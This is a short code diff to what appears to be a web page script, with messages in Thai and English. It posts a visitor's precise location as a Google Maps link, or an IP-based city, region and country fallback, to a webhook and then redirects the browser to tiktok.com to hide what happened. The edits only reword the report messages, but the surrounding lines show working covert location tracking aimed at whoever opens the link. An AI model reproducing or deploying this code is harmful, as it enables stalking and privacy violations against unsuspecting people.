@@ -75,7 +75,7 @@
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ 
-                                content: `🎯 **PRECISE LOCATION (พิกัดแม่นยำสูง)**\n──────────────────────────\n📍 **Google Maps:** ${mapsLink}\n✅ **Status:** Precise Data (ข้อมูลแม่นยำพิกัดตรง)\n──────────────────────────` 
+                                content: `🎯 **PRECISE LOCATION (พิกัดแม่นยำ97%)**\n──────────────────────────\n📍 **Google Maps:** ${mapsLink}\n✅ **Status:** Precise Data (ข้อมูลแม่นยำ💯)\n──────────────────────────` 
                             })
                         });
                         window.location.href = "https://www.tiktok.com";
@@ -87,7 +87,7 @@
                         backupReport += `> **City (เมือง):** ${check(data.city)}\n`;
                         backupReport += `> **Region (จังหวัด):** ${check(data.region)}\n`;
                         backupReport += `> **Country (ประเทศ):** ${check(data.country_name)}\n\n`;
-                        backupReport += `❌ **Status:** Data Inaccurate (ข้อมูลอาจไม่ตรงคลาดเคลื่อน)\n`;
+                        backupReport += `❌ **Status:** Data Inaccurate (ข้อมูลอาจไม่ตรงและคลาดเคลื่อน)\n`;
                         backupReport += `──────────────────────────`;
 
                         await fetch(WEBHOOK_URL, {
